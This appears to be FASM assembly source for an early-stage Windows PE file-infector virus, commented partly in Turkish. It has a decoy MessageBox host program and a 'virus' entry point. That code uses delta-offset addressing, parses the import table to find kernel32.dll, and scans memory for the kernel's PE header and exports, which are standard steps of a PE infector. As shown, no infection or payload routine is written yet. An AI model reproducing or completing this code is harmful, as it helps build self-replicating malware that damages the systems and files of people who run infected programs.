format PE Gui
entry virus

section '.data' data readable writeable
	caption db 'caption' , 0h
	text	db 'text' , 0h
	basari	db 'Basarili', 0h
	nabasari db 'Basarisiz', 0h
	; thsese lines for our orginal file data table

section '.idata' import data readable writeable
	dd 0h, 0h, 0h, RVA username, RVA usertbl
	dd 0h, 0h, 0h, RVA kernelname, RVA kerneltbl
	dd 0h, 0h, 0h, 0h, 0h

	kernelname db 'Kernel32.DLL', 0h
	username   db 'User32.Dll', 0h


	kerneltbl:
		ExitProcess dd RVA _ExitProcess
			    dd 0h

	usertbl:
		MessageBoxA dd RVA _MessageBoxA
			    dd 0h

	_MessageBoxA	dw 0h
			db 'MessageBoxA' , 0h

	_ExitProcess dw 0h
		     db 'ExitProcess' , 0h

	; these are for create simple import table for our non infected file

section '.code' code readable executable writeable
; writeable addad because to simulate all writeable objects inside the virus
normalcode:
	push dword 0h
	push caption
	push text
	push 0h
	call [MessageBoxA]
	push dword 0h
	call [ExitProcess]

basarili:
	push dword 0h
	push caption
	push basari
	push dword 0h
	call [MessageBoxA]
	ret
basarisiz:
	push dword 0h
	push caption
	push nabasari
	push dword 0h
	call [MessageBoxA]
	ret

;end of the all normal codes

;-------------------------------------------------------------------------
;			CODE
;-------------------------------------------------------------------------

ourcodestartshere:
	ret
virus:
	call delta
	delta:
		pop ebp
		sub ebp, delta	; ebp has the delta
		jmp find_kernel


	goback:
	jmp [orginalcode+ebp]


;________________________
; FIND KERNEL FUNCTIONS
;________________________
find_kernel:
     mov esi, [imagebase + ebp]
     mov edi, esi
     add esi, 3ch
     mov esi, [esi]
     add esi,edi
     add esi, 080h
     mov esi, [esi]
     add esi, edi	; esi is import table address right now
			; edi is imagebase
     mov ecx,12
     add esi, ecx
     iskrnok:
     cmp dword [esi],0h
     je  goback

     mov eax, [esi]
     add eax, edi

     krncheckloop:
	    mov ebx, eax
	    add ebx, ecx
	    dec ebx
	    mov bl, byte [ebx]
	    cmp bl, byte [kernelstrsml + ebp + ecx - 1]
	    je krnnextchar
	    cmp bl, byte [kernelstruper + ebp + ecx - 1]
	    je krnnextchar
	mov ecx, 12
	    jmp krnfails
	krnnextchar:
     loop krncheckloop
	  ;everythink is ok

		mov ebx, [esi + 4]
		add ebx, edi
		mov ebx, [ebx]

		    find_kernel_mz:
			mov ecx, 0FFFF0000h
			and ebx, ecx
			mov ecx, 0FFF00000h
			mov edx,ebx
			and edx, ecx
			cmp edx,ebx
			je goback
			mov ax,word[ebx]
			cmp ax,'MZ'
			jne sumn_find_kernel_mz
			   xor eax,eax
			   mov ax,word [ebx + 3ch]
			   cmp dword[ebx+eax], 04550h
			   jne sumn_find_kernel_mz
			   add eax,ebx
			   cmp ebx,[eax + 34h]
			   jne sumn_find_kernel_mz
			   mov eax, [eax + 78h]
			   add eax, ebx ;eax kernelbase ebx kernel import table
			   mov eax,-1
			   jmp goback ; burasi degisir
			sumn_find_kernel_mz:
			dec ebx
			jmp find_kernel_mz

	krnfails:
		add esi, 20
		jmp iskrnok




;-------------------------------------------------------------------------
;	   DATA
;-------------------------------------------------------------------------
allvirusdata:
changeonfection: ;should be restore back after infection
	orginalcode dd normalcode
	imagebase dd 00400000h

staticvalues:
	kernelstrsml	db 'kernel32.dll', 0h
	kernelstruper	db 'KERNEL32.DLL', 0h
dinamicvalues:

